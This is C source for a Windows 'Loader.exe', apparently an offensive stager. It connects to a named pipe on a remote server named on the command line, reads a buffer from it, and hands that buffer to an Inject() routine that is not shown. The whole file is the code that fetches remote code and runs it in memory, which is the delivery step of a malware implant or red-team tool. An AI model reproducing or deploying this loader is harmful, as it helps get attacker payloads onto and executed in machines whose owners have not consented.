#include "Header.h"

int PrintHelp( )
{
	puts( "[*] Usage: Loader.exe [SERVER] [PIPENAME]\n" );
	return ( 0 );
}

BOOL ReadFromPipe( HANDLE hPipe, PVOID* ppBuffer, PDWORD pSize )
{
	PVOID	pBuffer = NULL;
	DWORD	dwBytesRead = 0;

	if ( !PeekNamedPipe( hPipe, NULL, 0, NULL, &dwBytesRead, NULL ) )
	{
		printf( "[!] PeekNamedPipe Failed (%d).\n", GetLastError( ) );
		return ( FALSE );
	}

	if ( dwBytesRead == 0 )
		return ( FALSE );

	pBuffer = LocalAlloc( LPTR, dwBytesRead );
	if ( !pBuffer )
		return ( FALSE );

	if ( !ReadFile( hPipe, pBuffer, dwBytesRead, NULL, NULL ) )
	{
		LocalFree( pBuffer );
		return ( FALSE );
	}

	if ( ppBuffer )
		*ppBuffer = pBuffer;
	if ( pSize )
		*pSize = dwBytesRead;

	return ( TRUE );
}

int main( int argc, char* argv[ ] )
{
	HANDLE			hPipe = NULL;
	PVOID			Buffer = NULL;
	DWORD			Size = 0;
	PCHAR			PipeName = NULL;
	PCHAR			Server = NULL;
	CHAR			NetworkPath[ MAX_PATH ] = { 0 };

	if ( argc < 2 )
		return PrintHelp( );

	Server = argv[ 1 ];
	PipeName = argv[ 2 ];

	sprintf( NetworkPath, "\\\\%s\\pipe\\%s", Server, PipeName );

	hPipe = CreateFileA( NetworkPath,
				GENERIC_READ |
				GENERIC_WRITE,
				0,
				NULL,
				OPEN_EXISTING,
				0,
				NULL );
	if ( hPipe == INVALID_HANDLE_VALUE )
	{
		printf( "[!] CreateFileA Failed (%d)\n", GetLastError( ) );
		return ( 0 );
	}

	if ( !ReadFromPipe( hPipe, &Buffer, &Size ) )
	{
		puts( "[-] Failed to read from the named pipe" );
		goto cleanup;
	}

	if ( !Inject( Buffer, Size ) )
	{
		puts( "[-] Injection Failed" );
		goto cleanup;
	}

cleanup:
	CloseHandle( hPipe );
	return ( 0 );
}
